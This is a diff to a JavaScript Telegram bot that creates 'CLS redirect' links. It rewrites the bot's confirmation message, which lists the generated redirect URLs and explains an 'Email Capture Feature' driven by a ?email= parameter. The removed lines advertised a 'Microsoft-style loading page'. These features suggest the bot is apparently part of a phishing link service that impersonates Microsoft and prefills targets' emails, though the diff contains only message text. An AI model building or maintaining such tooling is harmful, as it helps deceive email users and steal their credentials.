@@ -682,19 +682,12 @@ if (bot) {
         // Step 3: Replace status message with final results
         const responseMessage =
           `🎉 *CLS Redirect Successfully Created!*\n\n` +
-          `🌐 *Your Domain:* \`${domain}\`\n` +
-          `🎯 *Redirects To:* ${redirectUrl}\n\n` +
+          `🌐 *Your Domain:* \`${domain}\`\n\n` +
           `🚀 *Live Redirect URLs:*\n` +
           urls.map((url, index) => `${index + 1}. ${url}`).join("\n") +
           "\n\n" +
-          `✅ *All Systems Live!* Your redirects are now active with SSL.\n\n` +
           `📧 *Email Capture Feature:* Add ?email= parameter\n` +
-          `*Usage:* yourlink.html?email=user@domain.com\n\n` +
-          `🎨 *Features Included:*\n` +
-          `• Professional Microsoft-style loading page\n` +
-          `• SSL certificate automatically installed\n` +
-          `• Email parameter capture ready\n` +
-          `• Lightning-fast redirect performance`;
+          `*Usage:* yourlink.html?email=user@domain.com`;
 
         // Replace the status message with final results
         await ctx.telegram.editMessageText(
